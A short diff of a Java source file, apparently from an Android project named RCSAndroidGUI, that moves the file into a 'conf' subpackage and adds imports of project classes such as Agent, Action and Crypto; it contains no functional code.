@@ -5,11 +5,22 @@
  * Created   : 01-dec-2010
  **********************************************/
 
-package com.ht.RCSAndroidGUI;
+package com.ht.RCSAndroidGUI.conf;
 
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
+
+import com.ht.RCSAndroidGUI.Debug;
+import com.ht.RCSAndroidGUI.Event;
+import com.ht.RCSAndroidGUI.R;
+import com.ht.RCSAndroidGUI.RCSException;
+import com.ht.RCSAndroidGUI.Status;
+import com.ht.RCSAndroidGUI.R.raw;
+import com.ht.RCSAndroidGUI.action.Action;
+import com.ht.RCSAndroidGUI.agent.Agent;
+import com.ht.RCSAndroidGUI.crypto.Crypto;
+import com.ht.RCSAndroidGUI.utils.Utils;
 
 import android.content.res.Resources;
 import android.util.Log;
